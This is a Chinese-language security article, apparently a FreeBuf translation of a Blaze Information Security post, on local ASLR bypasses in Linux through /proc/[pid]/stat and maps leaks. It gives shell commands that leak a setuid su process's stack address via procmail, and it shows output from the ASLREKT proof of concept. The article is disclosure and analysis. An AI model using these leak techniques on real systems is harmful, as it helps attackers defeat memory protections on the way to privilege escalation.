@@ -1,0 +1,205 @@
+![](https://image.3001.net/images/20200228/1582899054_5e591f6e7e7a2.jpg!small)
+
+##  介绍
+
+ **ASLR，应为全称为Address Space Layout
+Randomization，即地址空间布局随机化。它是一种概率性安全防御机制，由PaX团队于2001年正式提出，并在2005年开始引入到Linux内核之中。ASLR能够在每次运行可执行文件的时候通过基地址随机映射的方式来为其随机分配地址空间。ASLR存在的目的，就是为了防止那些需要了解内存地址来利用内存崩溃漏洞的攻击行为。**
+
+在此之前，内存崩溃漏洞的成功利用需要来了解硬编码的内存地址，以便攻击者获取到可执行指令的地址并实现任意代码执行，或破坏关键的程序数据。ASLR最初是用来抵御和防范远程攻击者的，因为攻击者需要获取到目标设备的内存地址才能执行攻击，那么对于远程攻击者来说，实现掌握的关于内存地址的信息肯定不会很多。
+
+##  历史回顾
+
+对于本地攻击者来说，/proc/[pid]/一直都存在各种问题，而且一般都是信息泄露漏洞的主要来源。2009年，谷歌安全团队的Tavis
+Ormandy和Julien Tinnes曾在CanSecWest就Linux
+ASLR这个话题进行过一次演讲【[PDF](https://www.cr0.org/paper/to-jt-linux-alsr-leak.pdf)】，并在演讲中演示了如何通过/proc/[pid]/stat和/proc/[pid]/wchan来获取目标进程中的指令指针以及堆栈指针等信息，而这些信息可以帮助攻击者重建目标进程的地址空间布局。
+
+十年后的2019年4月3日，一个针对v4.8以下版本Linux内核的[漏洞利用代码](https://www.openwall.com/lists/oss-security/2019/04/03/4/1)被曝光，而这个漏洞同样利用了/proc/[pid]/stat来获取之前提到的指令指针和栈指针。因为fs/binfmt_elf.c中的load_elf_binary()调用install_exec_creds()的时机太晚了，可执行文件已经被映射到地址空间，然后才设置访问凭证，因此攻击者将能够绕过ptrace_may_access()检的查，而这个检查机制正是为了修复Tavis和Julien提出的攻击而引入的。攻击者只要在install_exec_creds()调用前使用read()来读取/proc/[pid]/stat，就可利用这一个竞争条件漏洞了。
+
+2019年4月25日，就在CVE-2019-11190被曝光之后，SUSE Linux的安全工程师也在Openwall的oss-sec列表上发布了一个已被修复了的安全问题，版本号低于3.18的内核版本都会受到该[漏洞](https://www.openwall.com/lists/oss-security/2019/04/25/4)的影响。这个漏洞是一个ASLR绕过漏洞，由于/proc/[pid]/maps伪文件的权限检查放在了read()，而不是open()，这个伪文件中包含当前映射的内存区域及其访问权限。
+
+    
+    
+    $ cat /proc/self/maps
+    
+        00400000-0040c000 r-xp 00000000 08:04 3670122                            /bin/cat
+    
+        0060b000-0060c000 r--p 0000b000 08:04 3670122                            /bin/cat
+    
+        0060c000-0060d000 rw-p 0000c000 08:04 3670122                            /bin/cat
+    
+        02496000-024b7000 rw-p 00000000 00:00 0                                  [heap]
+    
+        7f508bd4b000-7f508beec000 r-xp 00000000 08:04 7605352                    /lib/x86_64-linux-gnu/libc.so
+    
+        7f508beec000-7f508c0ec000 ---p 001a1000 08:04 7605352                    /lib/x86_64-linux-gnu/libc.so
+    
+        7f508c0ec000-7f508c0f0000 r--p 001a1000 08:04 7605352                    /lib/x86_64-linux-gnu/libc.so
+    
+        7f508c0f0000-7f508c0f2000 rw-p 001a5000 08:04 7605352                    /lib/x86_64-linux-gnu/libc.so
+    
+        7f508c0f2000-7f508c0f6000 rw-p 00000000 00:00 0 
+    
+        7f508c0f6000-7f508c117000 r-xp 00000000 08:04 7605349                    /lib/x86_64-linux-gnu/ld.so
+    
+        7f508c164000-7f508c2ed000 r--p 00000000 08:04 800126                     /usr/lib/locale/locale-archive
+    
+        7f508c2ed000-7f508c2f0000 rw-p 00000000 00:00 0 
+    
+        7f508c2f2000-7f508c316000 rw-p 00000000 00:00 0 
+    
+        7f508c316000-7f508c317000 r--p 00020000 08:04 7605349                    /lib/x86_64-linux-gnu/ld.so
+    
+        7f508c317000-7f508c318000 rw-p 00021000 08:04 7605349                    /lib/x86_64-linux-gnu/ld.so
+    
+        7f508c318000-7f508c319000 rw-p 00000000 00:00 0 
+    
+        7ffcf3496000-7ffcf34b7000 rw-p 00000000 00:00 0                          [stack]
+    
+        7ffcf351b000-7ffcf351e000 r--p 00000000 00:00 0                          [vvar]
+    
+        7ffcf351e000-7ffcf351f000 r-xp 00000000 00:00 0                          [vdso]
+    
+        ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
+
+从v2.6.22开始，如果你无法将ptrace()附加到某进程下的话，Linux内核就不允许它读取/proc/[pid]/maps，这也就意味着非特权用户将无法读取映射的伪文件。
+
+    
+    
+    $ su &
+    
+        [1] 2661
+    
+        $ cat /proc/2661/maps
+    
+        cat: /proc/2661/maps: Permission denied
+
+正如在oss-sec的漏洞公告中介绍的那样，权限检查在read()出执行，这里之所以存在安全问题，是因为非特权用户可以打开映射文件，从中获取到有效的文件描述符，然后将其发送给特权程序。例如setuid
+root，而某些特权程序可以以某种方式将文件中的内容泄露给非特权用户，因为特权进程有权限利用read()函数来读取映射文件。
+
+相关的漏洞修复方案可以点击【[这里](https://github.com/torvalds/linux/commit/29a40ace841cba9b661711f042d1821cdc4ad47c)】获取。
+
+##  漏洞分析
+
+但是，这个修复方案是存在问题的，因为还有其他的/proc/[pid]/伪文件可以泄露当前映射的内存地址，而它们的权限检查仍然是在read()处进行的。在这里，引发问题的还是/proc/[pid]/stat。
+
+    
+    
+    $ su &
+    
+        [1] 2767
+    
+        $ ls -l /proc/2767/stat
+    
+        -r--r--r-- 1 root root 0 Feb  4 16:50 /proc/2767/stat
+    
+        [1]+  Stopped                 su
+    
+        $ cat /proc/2767/stat
+    
+        2767 (su) T 2766 2767 2766 34817 2773 1077936128 266 0 1 0 0 0 0 0 20 0 1 0 181759 58273792 810 18446744073709551615 1 1 0 0 0 0 524288 6 0 0 0 0 17 1 0 0 6 0 0 0 0 0 0 0 0 0 0
+
+但这一次情况的不同之处就在于，非特权用户可以在不将ptrace()附加到目标进程的情况下读取其所属的/proc/[pid]/stat，但是此时的内存地址字段都被字符“0”替换了。Linux
+v5.5中的fs/proc/array.c部分代码如下：
+
+    
+    
+    static int do_task_stat(struct seq_file *m, struct pid_namespace *ns,
+    
+        struct pid *pid, struct task_struct *task, int whole)
+    
+        {
+    
+        [...]
+    
+        int permitted;
+    
+        [...]
+    
+        permitted = ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS | PTRACE_MODE_NOAUDIT);
+    
+        [...]
+    
+        seq_put_decimal_ull(m, " ", mm ? (permitted ? mm->start_code : 1) : 0);
+    
+        seq_put_decimal_ull(m, " ", mm ? (permitted ? mm->end_code : 1) : 0);
+    
+        seq_put_decimal_ull(m, " ", (permitted && mm) ? mm->start_stack : 0);
+    
+        [...]
+    
+        }
+
+这个漏洞的利用方式跟SUSE的安全工程师在oss-sec上发布的一样，只不过这种情况下读取的应该是/proc/[pid]/stat。除此之外，还有一些其他可能会泄露内存地址的setuid文件，其中包括procmail、spice-client-glib-usb-acl-helper和setuid root。
+
+比如说，我们下面用procmail来举个例子：
+
+    
+    
+    $ su &
+    
+        [1] 3122
+    
+        $ cut -d' ' -f51 /proc/3122/stat
+    
+        0
+    
+        [1]+  Stopped                 su
+    
+        $ procmail < /proc/3122/stat
+    
+        $ tail -2 /var/spool/mail/user | cut -d' ' -f51
+    
+        140726221803504
+    
+        $ printf '0x%x\n' 140726221803504
+    
+        0x7ffd60760ff0
+    
+        # cat /proc/3122/maps
+    
+        [...]
+    
+        7ffd60740000-7ffd60761000 rw-p 00000000 00:00 0                          [stack]
+
+##  漏洞利用
+
+我们已将完整的漏洞利用PoC-ASLREKT发布在了GitHub上，感兴趣的用户自行可以下载并测试。
+
+> ASLREKT：【[传送门](https://github.com/blazeinfosec/aslrekt)】
+
+###  下面给出的是PoC的执行情况：
+
+    
+    
+    $ ./aslrekt
+    
+        ***** ASLREKT *****
+    
+        Password: 
+    
+        [+] /bin/su .text is at 0x564219868000
+    
+        [+] /bin/su heap is at 0x56421b657000
+    
+        [+] /bin/su stack is at 0x7ffe78d76000
+    
+        # cat /proc/$(pidof su)/maps
+    
+        564219868000-564219871000 r-xp 00000000 08:04 3674996                    /bin/su
+    
+        [...]
+    
+        56421b657000-56421b678000 rw-p 00000000 00:00 0                          [heap]
+    
+        [...]
+    
+        7ffe78d76000-7ffe78d97000 rw-p 00000000 00:00 0                          [stack]
+
+##  总结
+
+自从Linux将ASLR引入内核机制以来，针对ASLR的本地攻击一直都未能断绝，毫无疑问，以后针对ASLR的攻击也不会减少。Linux的内核开发者们似乎对/proc/[pid]/的安全问题也缺乏一定的认识，因此该问题才迟迟得不到适当的解决。
+
+ *** 参考来源：[blazeinfosec](https://blog.blazeinfosec.com/the-never-ending-problems-of-local-aslr-holes-in-linux/)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**
+
+  
+
